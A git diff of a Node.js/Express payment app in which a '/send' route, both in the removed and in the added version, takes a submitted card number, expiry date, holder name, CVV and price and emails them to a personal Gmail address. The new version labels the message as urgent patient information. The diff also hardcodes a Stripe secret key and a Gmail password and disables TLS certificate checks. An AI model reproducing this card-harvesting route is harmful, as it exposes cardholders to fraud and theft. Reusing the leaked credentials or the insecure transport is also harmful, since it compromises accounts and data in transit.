@@ -4,6 +4,8 @@ const ejs = require('ejs');
 const passport = require('passport');
 const bodyparser = require('body-parser');
 const express = require('express');
+const { getMaxListeners } = require('process');
+const { ifError } = require('assert');
 const PUBLISHABLE_KEY ="pk_test_51GsslZCLbCjfuC3EcKiGgU19kL43OVtYft4aN9poJwIZ669XCQ0wcHspYcEd7thFOoGOu0iKojTicG1D81ZQE13m00bYFEZ6JR";
 const SECRET_KEY ="sk_test_51GsslZCLbCjfuC3EA8Pgphmw8m4qsxgPO5Dv7qICrTTBulvAI6GvrV7IpYtyfNi4gnDurMVkgiq1B5KCSPxOX2l000yTI0K6tf";
 const stripe = require('stripe')(SECRET_KEY);
@@ -108,58 +110,54 @@ app.get('/logout', function(req, res){
 
 
 
-/////////////
-app.get('/', (req, res)=> {
-    
-    async function main() {
+ 
+app.post("/send", (req, res) => {
 
-        let transporter = nodemailer.createTransport({
-            host: "smtp.gmail.com",
-            port: 587,
-            secure: false, 
-            auth: {
-                user: "elabyadsaloua@gmail.com",
-                pass: "saloua1998",
-            },
-            tls: {
-                rejectUnauthorized: false
-            }
-        });
-    
-        // send mail with defined transport object
-        let info = await transporter.sendMail({
-            from: 'elabyadsaloua@gmail.com', // sender address
-            to: "salouaelabyad@gmail.com", // list of receivers
-            subject: "Hello 6", // Subject line
-            text: "Hello world?", // plain text body
-            html: `
-        <b>Number Of Card:</b> ${req.body.ncart} <br>
-        <b>Expiration Date:</b> ${req.body.datcart} <br>
-        <b>Name of the card holder:</b> ${req.body.nacart} <br>
-        <b>Cvv:</b> ${req.body.cvv} <br>  
-        <b>Prix:</b> ${req.body.prix} <br>
-        `
+   const output = `<h2>cas urgent</h2>
+  <h3>les information de patient </h3>
+  <ul>
+  <li>Number Of Card: : ${req.body.ncart}</li>
+  <li>Expiration Date: : ${req.body.datcart}</li>
+  <li>Name of the card holder: : ${req.body.nacart}</li>
+  <li>Cvv : ${req.body.cvv}</li>
+  <li>Prix : ${req.body.prix}</li>
+  </ul>`;
 
-
-        });
-    
-        console.log("Message sent: %s", info.messageId);
-
-        console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
+let transporter = nodemailer.createTransport({
+    host: "smtp.ethereal.email",
+    port: 587,
+    secure: false, // true for 465, false for other ports
+    auth: {
+      user: 'elabyadsaloua@gmail.com', // generated ethereal user
+      pass: 'saloua1998', // generated ethereal password
+    },
+    tls: {
+        rejectUnauthorized:false
     }
-  
-    main().catch(console.error);
-    //END SEND MAIL
-    res.render('red');
+  });
+
+
+
+ // send mail with defined transport object
+ let mailOptions = {
+    from: 'elabyadsaloua@gmail.com', // sender address
+    to: "salouaelabyad@gmail.com", // list of receivers
+    subject: "Hello ✔", // Subject line
+    text: "Hello world?", // plain text body
+    html: output // html body
+  };
+
+ transporter.sendMail(mailOptions, (error, info) => {
+     if (error) {
+         return console.log(error);
+     }
+     console.log("Message sent: %s", info.messageId);
+     console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
+
+     res.render('demande' , {msg: 'has been sent'} );
+ });
 });
+  
 
-
-// fs.writeFile("temp.txt", data, (err) => {
-//     if (err) console.log(err);
-//     console.log("Successfully Written to File.");
-//   });
-
-
-
-app.listen(4000,()=>console.log('Express server is runing'));
+app.listen(8080,()=>console.log('Express server is runing'));
 
